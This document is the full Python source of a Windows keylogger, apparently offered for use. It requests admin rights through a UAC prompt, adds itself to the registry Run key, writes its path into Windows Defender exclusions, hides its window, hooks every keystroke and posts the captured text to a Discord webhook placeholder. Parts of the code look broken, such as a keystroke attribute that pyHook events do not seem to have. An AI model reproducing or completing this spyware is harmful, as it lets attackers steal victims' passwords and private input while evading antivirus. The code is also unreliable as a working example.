import pyHook
import pythoncom
import requests
import json
import win32api
import win32con
import win32security
import win32event
import win32serviceutil
import win32service
import win32api
import win32gui
import win32process
import win32crypt
import os
import sys
import base64
import hashlib
import subprocess
import ctypes
import winreg

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_startup():
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "keylogger", 0, winreg.REG_SZ, sys.executable + ' ' + os.path.realpath(__file__))
        winreg.CloseKey(reg_key)
    except:
        pass

def add_to_exclusions():
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths')
        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, os.path.realpath(__file__))
        winreg.CloseKey(key)
    except:
        pass

def hide_window():
    try:
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, 0)
    except:
        pass

def onKeyBoardEvent(event):
    if event.Ascii == 13: # Enter key
        data = {
            "content": "".join(chr(key) for key in event.Keys)
        }
        requests.post(webhook_url, data=json.dumps(data), headers={'Content-Type': 'application/json'})
    return True

def start_keylogger():
    global webhook_url
    webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
    hm = pyHook.HookManager()
    hm.KeyDown = onKeyBoardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()

if is_admin():
    add_to_exclusions()
    add_to_startup()
    start_keylogger()
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    hide_window()